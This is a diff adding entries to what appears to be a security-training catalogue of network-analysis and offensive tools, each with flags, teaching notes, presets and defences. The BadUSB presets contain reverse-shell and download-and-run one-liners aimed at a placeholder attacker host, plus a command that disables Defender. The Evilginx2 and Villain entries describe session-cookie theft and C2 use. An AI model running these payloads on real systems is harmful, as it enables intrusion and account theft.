@@ -990,5 +990,211 @@
     },
     "defend_notes": "GoPhish simulations should be followed by immediate training for those who fell for the phish. Without training, simulations just embarrass users without building resilience. Track improvement over time — well-run programs show dramatically fewer clicks after 6-12 months of quarterly campaigns. Share anonymized results with leadership to justify security investment.",
     "mitre_techniques": ["T1566 - Phishing", "T1192 - Spearphishing Link"]
+  },
+
+  "tcpdump": {
+    "name": "TCPDump",
+    "binary": "tcpdump",
+    "category": "network_analysis",
+    "description": "The original command-line packet analyzer. Captures and displays network packets in real time. Available on every Linux system — no GUI needed. Used for incident response, malware C2 detection, credential sniffing on unencrypted protocols, and baseline network behavior analysis.",
+    "teach_intro": "TCPDump reads every packet off the wire and lets you filter in real time using BPF (Berkeley Packet Filter) syntax. It's the fastest way to see what's happening on a network interface right now. On an incident: run tcpdump first, analyze in Wireshark second. Understanding BPF filter syntax is a core SOC analyst skill.",
+    "default_command": "tcpdump -i eth0 -n -v",
+    "flags": {
+      "-i":      { "label": "Interface", "desc": "Network interface to capture on: eth0, wlan0, any", "example": "tcpdump -i eth0", "teach": "Use 'any' to capture all interfaces simultaneously. On Kali: ip link show lists available interfaces. -i lo captures loopback (local traffic).", "risk": "safe" },
+      "-n":      { "label": "No DNS Lookup", "desc": "Don't resolve IP addresses to hostnames. Faster output.", "example": "tcpdump -i eth0 -n", "teach": "DNS resolution slows output and can alert DNS servers. Always use -n in production captures — you want raw IPs for IOC matching, not resolved names.", "risk": "safe" },
+      "-v":      { "label": "Verbose", "desc": "More detail per packet including TTL, IP ID, checksum.", "example": "tcpdump -i eth0 -v", "teach": "-v shows IP header fields. -vv even more detail. -vvv maximum. For initial triage -v is usually right — enough detail without overwhelming output.", "risk": "safe" },
+      "-w":      { "label": "Write PCAP File", "desc": "Save capture to .pcap file for Wireshark analysis.", "example": "tcpdump -i eth0 -w /tmp/capture.pcap", "teach": "Always save PCAPs during incidents — they're your evidence. Open in Wireshark later: wireshark capture.pcap. Name with timestamp: capture_$(date +%Y%m%d_%H%M).pcap", "risk": "safe" },
+      "-r":      { "label": "Read PCAP File", "desc": "Read and filter a saved .pcap file.", "example": "tcpdump -r capture.pcap 'host 192.168.1.1'", "teach": "Post-capture analysis. Apply BPF filters to an existing PCAP to find specific traffic without recapturing.", "risk": "safe" },
+      "-c":      { "label": "Packet Count", "desc": "Stop after capturing N packets.", "example": "tcpdump -i eth0 -c 100", "teach": "Useful for quick samples. -c 1000 grabs 1000 packets and exits. Prevents runaway captures filling disk.", "risk": "safe" },
+      "-A":      { "label": "ASCII Output", "desc": "Print packet content in ASCII. See plaintext HTTP, FTP, Telnet passwords.", "example": "tcpdump -i eth0 -A port 80", "teach": "With -A you see the actual content of unencrypted packets. POST /login with username=admin&password=secret123 is fully readable. This is why HTTPS matters.", "risk": "noisy" },
+      "-X":      { "label": "Hex + ASCII", "desc": "Print packet content in both hex and ASCII.", "example": "tcpdump -i eth0 -X port 53", "teach": "Hex view catches non-printable characters in payloads — shellcode, binary protocols, or malware C2 using binary encoding.", "risk": "safe" },
+      "host":    { "label": "Filter: Host", "desc": "Capture only packets to/from a specific IP.", "example": "tcpdump -i eth0 host 192.168.1.100", "teach": "The most common filter. 'src host X' for outbound only, 'dst host X' for inbound only. Combine: 'src host X and dst host Y'.", "risk": "safe" },
+      "port":    { "label": "Filter: Port", "desc": "Capture traffic on a specific port.", "example": "tcpdump -i eth0 port 443", "teach": "Critical SOC filters: port 4444 (Metasploit), port 8080 (common C2), port 53 (DNS exfiltration). 'not port 443 and not port 80' shows non-web traffic.", "risk": "safe" },
+      "net":     { "label": "Filter: Network", "desc": "Capture traffic to/from an entire subnet.", "example": "tcpdump -i eth0 net 192.168.1.0/24", "teach": "Subnet-level monitoring. 'not net 10.0.0.0/8' excludes internal traffic to focus on external communications — fast C2 beacon detection.", "risk": "safe" },
+      "proto":   { "label": "Filter: Protocol", "desc": "Filter by protocol: tcp, udp, icmp, arp", "example": "tcpdump -i eth0 icmp", "teach": "ICMP tunneling is a real attack. 'tcpdump icmp' shows all pings. Large ICMP payloads or high frequency indicate data exfil via ICMP.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Quick Capture":    { "flags": ["-i", "eth0", "-n", "-v", "-c", "200"], "desc": "Quick 200-packet sample with verbose output." },
+      "Save PCAP":        { "flags": ["-i", "eth0", "-n", "-w", "/tmp/capture_$(date +%s).pcap"], "desc": "Save full capture to PCAP for Wireshark." },
+      "HTTP Sniffer":     { "flags": ["-i", "eth0", "-A", "-n", "port", "80"], "desc": "See plaintext HTTP content including credentials." },
+      "C2 Hunt":          { "flags": ["-i", "eth0", "-n", "not", "port", "443", "and", "not", "port", "80", "and", "not", "port", "53"], "desc": "Show all non-standard outbound traffic — C2 detection." },
+      "DNS Monitor":      { "flags": ["-i", "eth0", "-n", "-v", "port", "53"], "desc": "Monitor all DNS queries — detect DNS exfiltration." },
+      "Credential Watch": { "flags": ["-i", "eth0", "-A", "-n", "port", "21", "or", "port", "23", "or", "port", "110"], "desc": "Sniff FTP, Telnet, POP3 — all transmit credentials in plaintext." }
+    },
+    "defend_notes": "Encrypt everything — TLS 1.3 renders tcpdump captures useless for reading payload content. For defenders: tcpdump IS your first response tool. Keep a captured baseline of normal traffic patterns. Alert on: unusual outbound ports, high-frequency small packets (C2 beaconing), ICMP payloads > 64 bytes (tunneling), DNS queries to random-looking domains (DGA malware).",
+    "mitre_techniques": ["T1040 - Network Sniffing", "T1046 - Network Service Discovery"]
+  },
+
+  "snort": {
+    "name": "Snort 3",
+    "binary": "snort",
+    "category": "network_analysis",
+    "description": "The world's most widely deployed open-source intrusion detection and prevention system (IDS/IPS). Analyzes network traffic in real time against a rule set of thousands of known attack signatures. Detects exploits, malware C2, port scans, and policy violations.",
+    "teach_intro": "Snort works by comparing network packets against a database of rules. Each rule describes the pattern of a known attack. When a packet matches, Snort alerts you. In IDS mode it watches and alerts. In IPS mode (inline) it blocks the traffic. Understanding Snort rules is fundamental SOC analyst knowledge — every SIEM integrates with IDS alerts.",
+    "default_command": "snort -i eth0 -c /etc/snort/snort.conf -A console",
+    "flags": {
+      "-i":       { "label": "Interface", "desc": "Network interface to monitor.", "example": "snort -i eth0", "teach": "Specify the interface facing your network. For multiple interfaces: run multiple snort instances or use -i any (performance hit).", "risk": "safe" },
+      "-c":       { "label": "Config File", "desc": "Path to Snort configuration file.", "example": "snort -c /etc/snort/snort.conf", "teach": "The config file defines rule paths, preprocessors, output plugins, and network variables (HOME_NET, EXTERNAL_NET). Always review HOME_NET setting — it must match your network.", "risk": "safe" },
+      "-A":       { "label": "Alert Mode", "desc": "Alert output mode: console (screen), fast (file), full, none, cmg.", "example": "snort -i eth0 -c snort.conf -A console", "teach": "console mode prints alerts to terminal — good for testing. fast mode writes to /var/log/snort/alert — good for production. cmg mode is most detailed for analysis.", "risk": "safe" },
+      "-l":       { "label": "Log Directory", "desc": "Directory to write logs and alerts.", "example": "snort -i eth0 -c snort.conf -l /var/log/snort", "teach": "Snort creates alert files, packet logs, and unified2 binary logs here. Configure your SIEM to tail this directory. Unified2 format is readable by Barnyard2 for database integration.", "risk": "safe" },
+      "-T":       { "label": "Test Config", "desc": "Test configuration file without starting capture.", "example": "snort -c /etc/snort/snort.conf -T", "teach": "Always test config after changes: snort -T -c snort.conf. Catches syntax errors in rules and config before going live. Returns 'Snort successfully validated the configuration'.", "risk": "safe" },
+      "--daq":     { "label": "DAQ Module", "desc": "Data Acquisition module: pcap, afpacket, nfq (inline/IPS).", "example": "snort -i eth0 --daq afpacket -Q", "teach": "afpacket DAQ + -Q flag = IPS mode. Snort actually drops matching packets instead of just alerting. Requires inline network placement (between firewall and network).", "risk": "safe" },
+      "-r":       { "label": "Read PCAP", "desc": "Run rules against a saved PCAP file.", "example": "snort -r capture.pcap -c snort.conf -A console", "teach": "Replay a capture through Snort rules. Essential for IR: 'did our rules catch this attack?' Also for testing new rules against known-bad traffic.", "risk": "safe" },
+      "rule":     { "label": "Write Custom Rule", "desc": "Snort rule syntax: alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:\"Test\"; sid:9000001;)", "example": "alert tcp any any -> $HOME_NET 4444 (msg:\"Metasploit default port\"; sid:9000001; rev:1;)", "teach": "Rule anatomy: action protocol src_ip src_port direction dst_ip dst_port (options). Action: alert/drop/log. Options: msg (alert text), content (payload match), sid (unique ID), rev (revision). Every SOC analyst should be able to write basic Snort rules.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "IDS Mode":       { "flags": ["-i", "eth0", "-c", "/etc/snort/snort.conf", "-A", "console", "-l", "/var/log/snort"], "desc": "IDS mode — alert on attacks, don't block." },
+      "Test Config":    { "flags": ["-c", "/etc/snort/snort.conf", "-T"], "desc": "Validate config file without capturing." },
+      "PCAP Replay":    { "flags": ["-r", "{target}", "-c", "/etc/snort/snort.conf", "-A", "console"], "desc": "Run rules against saved PCAP file." },
+      "Community Rules":{ "flags": ["-i", "eth0", "-c", "/etc/snort/snort.conf", "-A", "fast", "-l", "/var/log/snort"], "desc": "Standard production IDS with community rules." }
+    },
+    "defend_notes": "Snort is a detector — it's only as good as its rules and tuning. Untuned Snort generates massive false positives. Tune by suppressing noisy rules on your specific network. Subscribe to Snort Subscriber rules for latest threat intelligence. Integrate with Splunk/ELK for SIEM correlation. Snort can be evaded by fragmentation, encryption, and protocol obfuscation — it's a layer, not a complete solution.",
+    "mitre_techniques": ["T1595 - Active Scanning", "T1046 - Network Service Discovery", "T1190 - Exploit Public-Facing Application"]
+  },
+
+  "zeek": {
+    "name": "Zeek (Bro)",
+    "binary": "zeek",
+    "category": "network_analysis",
+    "description": "Powerful open-source network security monitor and traffic analysis framework. Unlike Snort/Suricata which match signatures, Zeek analyzes protocols and generates structured logs for every connection, file transfer, DNS query, HTTP request, SSL certificate, and more. The SOC analyst's best friend for network forensics.",
+    "teach_intro": "Zeek doesn't alert on specific attack signatures — it creates rich structured logs of everything that happens on the network. conn.log (every TCP/UDP connection), dns.log (every DNS query), http.log (every HTTP request), ssl.log (every TLS handshake), files.log (every file transferred). These logs tell the story of an attack in a way packet captures can't.",
+    "default_command": "zeek -i eth0 local",
+    "flags": {
+      "-i":        { "label": "Interface", "desc": "Live capture interface.", "example": "zeek -i eth0 local", "teach": "Live capture mode. Zeek generates log files in the current directory. Run from /var/log/zeek/ or similar. 'local' loads the default local.zeek policy.", "risk": "safe" },
+      "-r":        { "label": "Read PCAP", "desc": "Analyze a saved PCAP file.", "example": "zeek -r capture.pcap local", "teach": "PCAP replay is Zeek's killer feature for IR. Drop in any PCAP and Zeek produces the same rich logs as live capture. Instantly tells you what happened in a 100MB packet capture.", "risk": "safe" },
+      "conn.log":  { "label": "Connection Log", "desc": "Every network connection: src, dst, port, duration, bytes, protocol.", "example": "zeek-cut id.orig_h id.resp_h id.resp_p proto duration < conn.log | sort -n -k5", "teach": "conn.log is your starting point. Long-duration connections = C2 beaconing. Large byte transfers = exfiltration. Many connections to one external IP = scanning/beaconing. Use zeek-cut to extract fields.", "risk": "safe" },
+      "dns.log":   { "label": "DNS Log", "desc": "Every DNS query and response: query, type, answers, TTL.", "example": "zeek-cut query answers < dns.log | grep -v '.arpa'", "teach": "DNS is the telltale of malware. DGA (Domain Generation Algorithm) malware queries hundreds of random-looking domains. DNS exfiltration encodes data in subdomain labels. High NX (no response) rates = DGA.", "risk": "safe" },
+      "http.log":  { "label": "HTTP Log", "desc": "Every HTTP request: method, host, URI, user-agent, response code, file size.", "example": "zeek-cut ts host uri method status_code < http.log", "teach": "HTTP log catches malware C2 over port 80. Suspicious: user-agents that don't match browsers, URIs with base64 data, POST requests to unusual hosts. Compare user-agent against known-good browser list.", "risk": "safe" },
+      "ssl.log":   { "label": "SSL/TLS Log", "desc": "Every TLS handshake: server name (SNI), cert issuer, cipher, version.", "example": "zeek-cut server_name issuer validation_status < ssl.log", "teach": "TLS doesn't hide metadata. SNI (Server Name Indication) reveals the hostname even in encrypted traffic. Self-signed certs (validation_status != ok) are suspicious. Old TLS versions (TLS 1.0) flag unpatched systems.", "risk": "safe" },
+      "files.log": { "label": "Files Log", "desc": "Every file transferred: type, source, destination, MD5/SHA1 hash.", "example": "zeek-cut md5 mime_type filename < files.log", "teach": "files.log extracts hashes of every transferred file. Take those MD5s and run them against VirusTotal. A PE executable downloaded over HTTP from an unusual host is an immediate alert.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Live Monitor":   { "flags": ["-i", "eth0", "local"], "desc": "Start live network monitoring, write all logs to current dir." },
+      "PCAP Analysis":  { "flags": ["-r", "{target}", "local"], "desc": "Analyze a PCAP file — produces all Zeek logs." },
+      "C2 Hunt":        { "flags": ["-r", "{target}", "local", "&&", "zeek-cut", "id.orig_h", "id.resp_h", "id.resp_p", "duration", "orig_bytes", "<", "conn.log", "|", "sort", "-rn", "-k4"], "desc": "Analyze PCAP then sort connections by duration — finds C2 beaconing." }
+    },
+    "defend_notes": "Zeek logs are gold for threat hunting. Forward them to a SIEM (Splunk, ELK, Graylog) for correlation and alerting. Use Zeek Intelligence Framework to feed in threat intel (malicious IPs, domains, hashes) and get automatic alerts. RITA (Real Intelligence Threat Analytics) analyzes Zeek logs specifically for C2 beaconing patterns. Store Zeek logs for 90+ days for IR lookback.",
+    "mitre_techniques": ["T1040 - Network Sniffing", "T1071 - Application Layer Protocol"]
+  },
+
+  "suricata": {
+    "name": "Suricata",
+    "binary": "suricata",
+    "category": "network_analysis",
+    "description": "High-performance open-source IDS/IPS/NSM (Network Security Monitor). Combines Snort-compatible signature detection with Zeek-style protocol analysis and file extraction. Multi-threaded — significantly faster than Snort on modern hardware. Generates EVE JSON logs ideal for SIEM integration.",
+    "teach_intro": "Suricata is the modern evolution of IDS. It runs Snort-compatible rules (Emerging Threats, Snort Community) but adds: multi-threading for speed, protocol parsers for 50+ protocols, file extraction (pull malware off the wire), and EVE JSON output that feeds directly into Elasticsearch/Splunk without a parser. Most enterprise SOCs run Suricata today.",
+    "default_command": "suricata -i eth0 -c /etc/suricata/suricata.yaml --af-packet",
+    "flags": {
+      "-i":          { "label": "Interface", "desc": "Network interface to monitor.", "example": "suricata -i eth0 -c /etc/suricata/suricata.yaml", "teach": "Suricata can monitor multiple interfaces: -i eth0 -i eth1. With --af-packet it uses AF_PACKET for high-performance capture without dropping packets at 10Gbps+.", "risk": "safe" },
+      "-c":          { "label": "Config File", "desc": "Path to suricata.yaml configuration.", "example": "suricata -c /etc/suricata/suricata.yaml -i eth0", "teach": "suricata.yaml controls everything: rule locations, log formats, file extraction, thresholds. Key setting: home-networks — must match your network or you'll get wrong direction alerts.", "risk": "safe" },
+      "--af-packet":  { "label": "AF-PACKET Mode", "desc": "Use AF_PACKET for high-speed capture. Best for live traffic.", "example": "suricata -i eth0 --af-packet -c /etc/suricata/suricata.yaml", "teach": "AF-PACKET bypasses normal socket overhead. Essential for 1Gbps+ networks. Uses multi-threading — Suricata automatically uses all CPU cores to process packets in parallel.", "risk": "safe" },
+      "-r":          { "label": "Read PCAP", "desc": "Run rules against saved PCAP file.", "example": "suricata -r capture.pcap -c /etc/suricata/suricata.yaml", "teach": "PCAP replay for IR. Did our rules catch this attack? Run the PCAP through Suricata and check eve.json for alerts. Essential for rule testing and post-incident analysis.", "risk": "safe" },
+      "-l":          { "label": "Log Directory", "desc": "Directory for output logs.", "example": "suricata -i eth0 -l /var/log/suricata -c suricata.yaml", "teach": "Suricata writes: eve.json (all events), fast.log (quick alerts), stats.log (performance), files/ (extracted files). eve.json is the main one — ship it to your SIEM.", "risk": "safe" },
+      "-S":          { "label": "Specific Rules File", "desc": "Load a specific rules file.", "example": "suricata -S /etc/suricata/rules/emerging-threats.rules -i eth0", "teach": "Test new rules without modifying suricata.yaml. Load specific rule sets: emerging-malware.rules for malware detection, emerging-exploit.rules for CVE exploit patterns.", "risk": "safe" },
+      "suricata-update":{ "label": "Update Rules", "desc": "Update rule sources including Emerging Threats.", "example": "suricata-update && suricata -T -c /etc/suricata/suricata.yaml", "teach": "Run suricata-update daily. Emerging Threats Open rules are free and updated constantly. After update: always test config (-T) before restarting. Rules cover latest malware families and CVEs.", "risk": "safe" },
+      "eve.json":    { "label": "EVE JSON Output", "desc": "Suricata's unified JSON log format for SIEM integration.", "example": "tail -f /var/log/suricata/eve.json | python3 -m json.tool | grep alert", "teach": "EVE JSON contains: alerts (IDS hits), flows (connection summaries), DNS, HTTP, TLS, files. Pipe to jq for filtering: cat eve.json | jq 'select(.event_type==\"alert\") | .alert.signature'. Ships directly to Elasticsearch.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "IDS Live":        { "flags": ["-i", "eth0", "--af-packet", "-c", "/etc/suricata/suricata.yaml", "-l", "/var/log/suricata"], "desc": "High-performance live IDS with all logging." },
+      "PCAP Analysis":   { "flags": ["-r", "{target}", "-c", "/etc/suricata/suricata.yaml", "-l", "/tmp/suricata_out"], "desc": "Analyze PCAP file for threats." },
+      "Update Rules":    { "flags": ["suricata-update", "&&", "suricata", "-T", "-c", "/etc/suricata/suricata.yaml"], "desc": "Update Emerging Threats rules then validate config." },
+      "Alert Tail":      { "flags": ["tail", "-f", "/var/log/suricata/eve.json", "|", "jq", "'select(.event_type==\"alert\")'"], "desc": "Live alert feed from EVE JSON log." }
+    },
+    "defend_notes": "Suricata at the network boundary catches attacks the endpoint misses. Deploy at: internet gateway, between network segments, on SPAN port from core switch. Enable file extraction to capture malware delivered over HTTP. Integrate eve.json with ELK or Splunk. Use Suricata + Zeek together — Suricata for signatures, Zeek for protocol analysis. Update rules daily with suricata-update.",
+    "mitre_techniques": ["T1595 - Active Scanning", "T1071 - Application Layer Protocol", "T1048 - Exfiltration Over Alternative Protocol"]
+  },
+
+  "evilginx2": {
+    "name": "Evilginx2",
+    "binary": "evilginx2",
+    "category": "social_engineering",
+    "description": "Man-in-the-middle phishing framework that bypasses two-factor authentication by acting as a reverse proxy between the victim and the legitimate website. Captures session cookies and credentials even when MFA is enabled. Used in authorized red team assessments to demonstrate advanced phishing risk.",
+    "teach_intro": "Evilginx2 is a next-generation phishing tool. Instead of faking a login page, it IS the login page — it proxies the real site. The victim logs in normally, completes MFA, and thinks everything is fine. Meanwhile Evilginx captures their session cookie. That cookie grants access without needing the password or MFA again. This is why security awareness training must teach people to check URLs carefully.",
+    "default_command": "evilginx2 -p /usr/share/evilginx2/phishlets",
+    "flags": {
+      "-p":          { "label": "Phishlets Path", "desc": "Directory containing phishlet YAML files.", "example": "evilginx2 -p /usr/share/evilginx2/phishlets", "teach": "Phishlets are YAML configs for specific sites (Microsoft 365, Google, LinkedIn). Each one tells Evilginx how to proxy and capture credentials from that specific service.", "risk": "very_noisy" },
+      "-developer":  { "label": "Developer Mode", "desc": "Skip DNS/certificate checks for local testing.", "example": "evilginx2 -developer", "teach": "Developer mode for testing without a real domain. Skips certificate validation so you can test phishlets locally before a real engagement.", "risk": "safe" },
+      "phishlets":   { "label": "Manage Phishlets", "desc": "In evilginx2 console: phishlets list / enable / hostname / disable", "example": "phishlets hostname o365 phish.yourdomain.com", "teach": "After starting evilginx2, configure phishlets in the interactive console. Set hostname to your controlled domain, enable the phishlet, get the phishing URL to send victims.", "risk": "noisy" },
+      "lures":       { "label": "Manage Lures", "desc": "Create and track phishing lures with unique redirect URLs.", "example": "lures create o365 && lures get-url 0", "teach": "Each lure has a unique URL that tracks individual victims. When a victim uses the lure URL, you see their captured credentials and cookies in real-time in the console.", "risk": "noisy" },
+      "sessions":    { "label": "View Captured Sessions", "desc": "Show all captured credentials and session tokens.", "example": "sessions && sessions 0", "teach": "After a victim logs in, sessions shows their: username, password, and session cookies. Copy the cookie into your browser (Edit This Cookie extension) to access their account directly.", "risk": "very_noisy" }
+    },
+    "preset_profiles": {
+      "Start Dev":     { "flags": ["-developer", "-p", "/usr/share/evilginx2/phishlets"], "desc": "Start in developer mode for local testing." },
+      "Production":    { "flags": ["-p", "/usr/share/evilginx2/phishlets"], "desc": "Start for real engagement (requires domain + DNS)." }
+    },
+    "defend_notes": "Evilginx-style attacks defeat SMS MFA and TOTP entirely because they steal the post-auth session cookie. Only FIDO2/WebAuthn hardware keys (YubiKey) are resistant — they bind authentication to the origin domain and will reject a phishing proxy. Implement: hardware MFA for privileged accounts, conditional access policies requiring compliant devices, Microsoft Entra ID Continuous Access Evaluation to revoke stolen sessions. Educate users to check the exact URL bar — evilginx uses a lookalike domain.",
+    "mitre_techniques": ["T1557 - Adversary-in-the-Middle", "T1566 - Phishing", "T1539 - Steal Web Session Cookie"]
+  },
+
+  "villain": {
+    "name": "Villain",
+    "binary": "villain",
+    "category": "exploitation",
+    "description": "Modern open-source C2 (Command and Control) framework for adversary simulation. Creates encrypted reverse shell handlers for Windows and Linux, supports multiple simultaneous sessions, team collaboration, and payload generation. Designed as a free alternative to Cobalt Strike for authorized red team operations.",
+    "teach_intro": "A C2 framework is the attacker's operations center. After exploitation, a payload on the victim connects back to Villain and gives you a persistent, encrypted shell. Villain handles multiple operators, logs all activity, and generates obfuscated payloads. Understanding C2 infrastructure is essential — both to simulate attacks and to hunt for them as a defender.",
+    "default_command": "villain",
+    "flags": {
+      "-p":          { "label": "Port", "desc": "Listening port for reverse connections. Default 6001.", "example": "villain -p 4444", "teach": "Pick ports that blend with legitimate traffic: 443 (HTTPS), 80 (HTTP), 8080, 8443. Firewalls block inbound but usually allow outbound to 443 — making 443 the classic C2 port.", "risk": "noisy" },
+      "-f":          { "label": "Teamserver File", "desc": "Load team server configuration.", "example": "villain -f teamserver.json", "teach": "In red team ops, multiple operators share one C2. Teamserver config defines shared settings so everyone connects to the same C2 infrastructure.", "risk": "safe" },
+      "generate":    { "label": "Generate Payload", "desc": "In Villain console: generate payload for Windows or Linux.", "example": "generate os=windows lhost=ATTACKER_IP lport=443", "teach": "Villain generates PowerShell or Bash one-liners that connect back. PowerShell payloads work in-memory without touching disk. The payload is the code you deliver to the victim.", "risk": "very_noisy" },
+      "sessions":    { "label": "List Sessions", "desc": "Show all active reverse shell connections.", "example": "sessions", "teach": "Each connected victim appears as a session. Shell into any: shell [session_id]. Sessions persist even if you close Villain — victims reconnect automatically.", "risk": "safe" },
+      "shell":       { "label": "Interact with Session", "desc": "Open interactive shell on a connected victim.", "example": "shell 0", "teach": "Interactive shell in the victim's context. From here: upload/download files, escalate privileges, pivot to other machines, harvest credentials. Always document every command for the report.", "risk": "very_noisy" }
+    },
+    "preset_profiles": {
+      "Start Server":   { "flags": ["-p", "443"], "desc": "Start Villain C2 listener on port 443." },
+      "Start Default":  { "flags": [""], "desc": "Start Villain with default settings (port 6001)." }
+    },
+    "defend_notes": "C2 frameworks generate distinctive network patterns: regular beaconing (periodic connections at fixed intervals), encrypted traffic to unusual external IPs, long-lived connections to single destinations. Detect via: NetFlow analysis for beaconing patterns, DNS for C2 domains (RITA/Zeek), proxy logs for unusual UserAgents, EDR process ancestry (PowerShell under Excel). UEBA (User and Entity Behavior Analytics) catches compromised accounts being used from C2 sessions.",
+    "mitre_techniques": ["T1071.001 - Application Layer Protocol: Web Protocols", "T1573 - Encrypted Channel", "T1059.001 - PowerShell"]
+  },
+
+  "badusb": {
+    "name": "BadUSB / Rubber Ducky",
+    "binary": "duckencoder",
+    "category": "hardware",
+    "description": "BadUSB attacks exploit the trust computers place in USB Human Interface Devices (HIDs). A malicious USB device impersonates a keyboard and types commands at superhuman speed the moment it's plugged in. Used with: Flipper Zero, USB Rubber Ducky, Bash Bunny, Pi Zero W, and the DigiSpark. Essential for demonstrating physical security gaps.",
+    "teach_intro": "Your computer unconditionally trusts keyboards. When a BadUSB device is plugged in, it tells the OS 'I am a keyboard' and immediately starts typing commands — opening a terminal, downloading a payload, creating a backdoor — all in seconds before anyone reacts. This is why physical access controls matter as much as network security.",
+    "default_command": "duckencoder -i payload.txt -o inject.bin",
+    "flags": {
+      "DELAY":       { "label": "Delay (ms)", "desc": "Wait N milliseconds before next command. Gives OS time to open applications.", "example": "DELAY 1000", "teach": "Without delays, commands execute before the OS is ready. DELAY 500 after WIN+R gives time for the Run dialog. DELAY 2000 after opening PowerShell gives it time to initialize.", "risk": "safe" },
+      "STRING":      { "label": "Type Text", "desc": "Type a string of characters exactly.", "example": "STRING powershell -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')\"", "teach": "STRING types text character by character at keyboard speed. This is how payloads are injected — type a PowerShell command directly into a Run box or terminal.", "risk": "very_noisy" },
+      "ENTER":       { "label": "Press Enter", "desc": "Simulate pressing the Enter key.", "example": "ENTER", "teach": "Submits forms, confirms dialogs, executes typed commands. Every command sequence ends with ENTER.", "risk": "safe" },
+      "GUI":         { "label": "Windows Key", "desc": "Press the Windows key, optionally with another key: GUI r = Win+R (Run dialog)", "example": "GUI r\nDELAY 500\nSTRING cmd\nENTER", "teach": "GUI r opens Run dialog — fastest way to open CMD or PowerShell. GUI x opens Power User menu. GUI l locks the workstation (useful for physical access scenarios).", "risk": "noisy" },
+      "ALT":         { "label": "Alt Key Combo", "desc": "ALT F4 closes windows, ALT TAB switches, ALT SPACE opens title menu.", "example": "ALT F4", "teach": "Key combinations for UI control. ALT F4 to close security popups before the user sees them. Used to hide evidence of the attack.", "risk": "noisy" },
+      "CTRL":        { "label": "Ctrl Key Combo", "desc": "CTRL ALT T opens terminal on Linux. CTRL C cancels. CTRL V pastes.", "example": "CTRL ALT T", "teach": "On Linux: CTRL ALT T opens terminal instantly — faster than any menu navigation. Combined with STRING and ENTER = immediate root shell if sudoers is misconfigured.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Win Reverse Shell": { "flags": ["DELAY 500\nGUI r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -ep bypass -Command \"IEX(iwr ATTACKER_IP/ps.ps1 -usebasicparsing)\"\nENTER"], "desc": "Windows PowerShell reverse shell via Run dialog." },
+      "Linux Root Shell":  { "flags": ["CTRL ALT T\nDELAY 1000\nSTRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\nENTER"], "desc": "Linux bash reverse shell via terminal shortcut." },
+      "Disable Defender":  { "flags": ["GUI r\nDELAY 500\nSTRING powershell Set-MpPreference -DisableRealtimeMonitoring $true\nENTER"], "desc": "Disable Windows Defender real-time protection." }
+    },
+    "defend_notes": "USB HID attacks are trivially defeated by: USB port locks (physical blockers), Group Policy disabling new HID device installation, USB Device Control software (CrowdStrike, Carbon Black), and endpoint software that requires authentication for new HID devices (USBGuard on Linux). Employee training: never plug in unknown USB devices — 'USB drops' in parking lots are a real attack vector. MFA on all accounts means even a successful payload launch needs credentials.",
+    "mitre_techniques": ["T1200 - Hardware Additions", "T1059 - Command and Scripting Interpreter", "T1566.001 - Phishing: Physical Media"]
+  },
+
+  "flipper": {
+    "name": "Flipper Zero",
+    "binary": "flipper_cli",
+    "category": "hardware",
+    "description": "Portable multi-tool for hardware and wireless security research. Combines: Sub-GHz radio (315/433/868/915 MHz), NFC, RFID (125kHz), Bluetooth, Infrared, GPIO, BadUSB, and iButton in a pocket-sized device. Used for testing physical access controls, RF protocols, and wireless attack scenarios.",
+    "teach_intro": "The Flipper Zero is a Swiss Army knife for physical and wireless security testing. It can read and replay key fobs, scan RFID access cards, capture and replay IR remote codes, emulate NFC cards, and act as a BadUSB device. It's a tool for understanding the RF and physical attack surface that digital-only security assessments miss.",
+    "default_command": "flipper_cli",
+    "flags": {
+      "Sub-GHz":   { "label": "Sub-GHz Radio", "desc": "Read, analyze, and replay Sub-GHz signals (car fobs, garage doors, weather stations, IoT).", "example": "Read mode: point at key fob and press Read → Save → Replay", "teach": "Most car key fobs and garage doors operate at 315MHz or 433MHz. Flipper captures the rolling code signal. Fixed-code remotes can be replayed directly. Rolling code (modern cars) requires more sophisticated attacks (RollJam).", "risk": "very_noisy" },
+      "NFC":       { "label": "NFC (13.56 MHz)", "desc": "Read, emulate, and write NFC cards including payment cards, building access cards.", "example": "NFC → Read card → Save → Emulate", "teach": "MIFARE Classic cards (used in many offices) have known crypto vulnerabilities and can be cloned. Modern high-security cards (DESFire EV2, SEOS) are resistant. Reading a card doesn't guarantee replay will work.", "risk": "very_noisy" },
+      "RFID":      { "label": "RFID (125kHz)", "desc": "Read and emulate low-frequency RFID cards (HID Prox, EM4100, Indala).", "example": "RFID → Read → Emulate", "teach": "125kHz RFID is the legacy standard for building access. These cards have NO encryption — anyone with a reader (including a Flipper) can read and clone them. Trivially defeated with a read from 10cm away.", "risk": "very_noisy" },
+      "IR":        { "label": "Infrared", "desc": "Capture and replay infrared remote signals. Universal remote + IR database.", "example": "IR → Learn New Remote → point at TV → Learn", "teach": "Flipper can learn any IR remote (TVs, ACs, projectors). The built-in IR database has universal codes for 1000+ devices. Physical pentest: walk into an office and turn off projectors during presentations.", "risk": "noisy" },
+      "BadUSB":    { "label": "BadUSB / HID Attack", "desc": "Execute DuckyScript payloads from SD card as a USB HID keyboard.", "example": "BadUSB → run_script.txt → plug into target PC", "teach": "Flipper Zero as BadUSB: plug into any USB port and it becomes a keyboard. Runs .txt DuckyScript files from SD card. Same capability as a USB Rubber Ducky but with all the other Flipper features too.", "risk": "very_noisy" },
+      "GPIO":      { "label": "GPIO / UART", "desc": "General purpose I/O pins for hardware hacking, UART communication with embedded devices.", "example": "GPIO → UART Terminal → connect to serial device", "teach": "UART is how embedded devices talk to each other. Many IoT devices have an exposed UART debug port. Connect Flipper to it and you often get a root shell on the device — physical hardware hacking.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "RFID Clone":    { "flags": ["RFID → Read → Save → Emulate"], "desc": "Read and clone a 125kHz access card." },
+      "NFC Read":      { "flags": ["NFC → Read"], "desc": "Identify and read an NFC card." },
